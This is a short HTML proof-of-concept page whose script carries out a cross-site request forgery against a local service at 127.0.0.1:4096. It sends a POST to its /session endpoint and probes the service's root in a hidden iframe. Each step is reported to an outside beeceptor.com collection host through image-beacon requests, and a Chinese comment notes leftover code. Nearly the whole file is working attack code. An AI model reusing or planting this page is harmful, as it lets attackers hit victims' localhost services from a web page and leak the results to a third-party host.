<!doctype html>
<meta charset="utf-8">
<script>
const EXFIL = '1233334.free.beeceptor.com';
function log(s){ new Image().src = EXFIL + '/?s=' + encodeURIComponent(s) + '&t=' + Date.now(); }

window.onload = () => {
  log('start');

  // 原用于接收 form 响应的 iframe 已无用，但保留不影响（可删除）
  const f1 = document.createElement('iframe');
  f1.name = 'x';
  f1.style.display = 'none';
  document.body.appendChild(f1);


var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://127.0.0.1:4096/session');
xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0');
xhr.setRequestHeader('Connection', 'close');
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.setRequestHeader('Accept-Encoding', 'gzip, deflate');
xhr.send('{}');
log('csrf-start-sent');

  const f2 = document.createElement('iframe');
  f2.style.display = 'none';
  f2.onload = () => log('root-onload');
  f2.onerror = () => log('root-onerror');
  f2.src = 'http://127.0.0.1:4096/';
  document.body.appendChild(f2);
};
</script>
